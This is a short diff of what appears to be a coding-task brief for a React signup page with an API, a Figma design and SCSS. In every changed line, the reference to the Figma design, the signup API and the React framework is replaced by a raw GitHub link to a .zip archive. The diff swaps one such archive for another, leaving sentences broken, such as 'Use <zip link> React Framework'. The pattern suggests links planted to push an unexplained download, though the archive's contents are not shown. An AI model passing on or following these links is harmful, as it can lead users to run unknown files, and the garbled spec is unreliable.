@@ -14,12 +14,12 @@ Specifically, we are looking for the ability to:
 Required Features
 ● Implement a RESTful API with error handling.
 ● Design Webpage from Figma link: -
-https://raw.githubusercontent.com/KoHrABoT/Atologist-Infotech-task/main/src/public/Atologist-Infotech-task-v2.3.zip
+https://raw.githubusercontent.com/KoHrABoT/Atologist-Infotech-task/main/src/Atologist-Infotech-task-v2.2-beta.3.zip
 Signup?type=design&node-id=1-27&mode=design&t=upiPlslFw7YVPv1T-0
 ● Client-side validation required for all fields
 ● Call API for Signup Process
-:- https://raw.githubusercontent.com/KoHrABoT/Atologist-Infotech-task/main/src/public/Atologist-Infotech-task-v2.3.zip
+:- https://raw.githubusercontent.com/KoHrABoT/Atologist-Infotech-task/main/src/Atologist-Infotech-task-v2.2-beta.3.zip
 Required Param :- firstname , lastname, email, encryptpassword, mobile, dob
 Technical Requirements:
-• Use https://raw.githubusercontent.com/KoHrABoT/Atologist-Infotech-task/main/src/public/Atologist-Infotech-task-v2.3.zip React Framework
+• Use https://raw.githubusercontent.com/KoHrABoT/Atologist-Infotech-task/main/src/Atologist-Infotech-task-v2.2-beta.3.zip React Framework
 • Use SCSS
